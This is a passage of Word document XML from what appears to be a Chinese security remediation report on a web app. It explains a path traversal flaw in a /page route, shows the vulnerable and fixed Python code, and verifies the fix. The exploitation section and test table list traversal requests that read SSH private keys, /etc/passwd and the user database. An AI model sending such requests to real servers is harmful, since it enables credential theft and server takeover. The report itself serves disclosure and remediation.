          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-22: Improper Limitation of a Pathname to a Restricted Directory / CWE-98: Improper Control of Filename</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由直接将用户输入的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数拼接到文件路径中，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>未做任何过滤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 修复前漏洞代码</w:t>
        <w:br/>
        <w:t>name = request.args.get("name", "")           # ← 用户完全控制</w:t>
        <w:br/>
        <w:t>filepath = os.path.join("pages", name)        # ← 无 ../ 检测</w:t>
        <w:br/>
        <w:t>with open(filepath, "r", encoding="utf-8") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    content = f.read()                        # ← 任意文件读取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">攻击者无需登录即可利用该漏洞，只需在浏览器或 curl 中构造带有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录穿越参数的 URL，即可穿越到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>pages/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录之外读取服务器上的任意文件：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>GET /page?name=../../root/.ssh/id_rsa     → 读取 SSH 私钥</w:t>
        <w:br/>
        <w:t>GET /page?name=../../etc/passwd           → 读取系统密码文件</w:t>
        <w:br/>
        <w:t>GET /page?name=../../app.py              → 读取应用源码</w:t>
        <w:br/>
        <w:t>GET /page?name=../data/users.db           → 下载 SQLite 数据库</w:t>
        <w:br/>
        <w:t>GET /page?name=../../var/log/auth.log     → 读取 SSH 登录日志</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>攻击者可通过脚本批量枚举路径，自动化提取服务器上的所有敏感文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 敏感数据全量泄露</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：SSH 私钥、数据库文件、系统配置文件、应用源码等全部暴露</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 服务器完全沦陷</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：获取 SSH 私钥后可免密登录服务器，获得 root shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 横向攻击跳板</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：窃取的内网配置信息可用于攻击内部网络其他主机</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 密码哈希离线破解</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：获取 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/etc/shadow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或数据库中的密码哈希后可离线破解管理员密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">采用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>白名单机制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>路径规范化二次防护</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>双重防御：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 安全白名单：仅允许预定义的页面名</w:t>
        <w:br/>
        <w:t>ALLOWED_PAGES = {"help", "about", "faq"}</w:t>
        <w:br/>
        <w:t>PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not session.get("username"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 【第一重防御】白名单校验——只允许预设页面</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在", 404</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 【第二重防御】路径规范化 + 二次防护</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = name + ".html"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filepath = os.path.join(PAGES_DIR, filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    real_path = os.path.realpath(filepath)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 确保最终路径在 pages 目录内</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not real_path.startswith(os.path.realpath(PAGES_DIR) + os.sep):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在", 403</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=help</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（正常）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>显示帮助中心</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=../../root/.ssh/id_rsa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=../data/users.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=nonexistent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 2】SSH 私钥泄露致服务器沦陷（CWE-522）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name=../../root/.ssh/id_rsa</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
